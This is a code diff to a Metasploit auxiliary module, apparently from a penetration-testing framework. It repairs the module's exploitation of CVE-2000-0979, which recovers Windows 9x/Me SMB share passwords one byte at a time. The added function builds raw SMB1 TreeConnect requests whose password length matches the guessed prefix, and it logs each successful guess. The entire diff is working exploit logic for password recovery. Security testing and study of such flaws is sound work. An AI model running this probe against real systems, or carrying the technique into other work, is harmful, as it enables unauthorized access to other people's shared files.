@@ -118,9 +118,26 @@ class MetasploitModule < Msf::Auxiliary
     []
   end
 
+  # Sends a raw SMB1 TreeConnect with a share password of exactly
+  # +password_bytes.length+ bytes. RubySMB::Client#tree_connect appends a NUL
+  # terminator and counts it in Password Length, which breaks the CVE-2000-0979
+  # byte-by-byte probe: the trailing NUL never matches the next real character,
+  # so no single-byte guess ever succeeds. Here Password Length equals the number
+  # of guessed bytes, matching how Win9x/Me validates the password prefix.
+  def tree_connect_raw(share_path, password_bytes)
+    client = simple.client
+    request = RubySMB::SMB1::Packet::TreeConnectRequest.new
+    request.smb_header.tid = 65_535
+    request.parameter_block.password_length = password_bytes.length
+    request.data_block.password = password_bytes.pack('C*')
+    request.data_block.path = share_path
+    raw_response = client.send_recv(request)
+    response = RubySMB::SMB1::Packet::TreeConnectResponse.read(raw_response)
+    client.smb1_tree_from_response(share_path, response)
+  end
+
   def try_tree_connect(share_path, password_bytes)
-    pass_str = password_bytes.pack('C*')
-    tree = simple.client.tree_connect(share_path, password: pass_str)
+    tree = tree_connect_raw(share_path, password_bytes)
     vprint_status(
       "TreeConnect #{share_path} pw=#{password_bytes.map { |b| '%02X' % b }.join} STATUS_SUCCESS"
     )
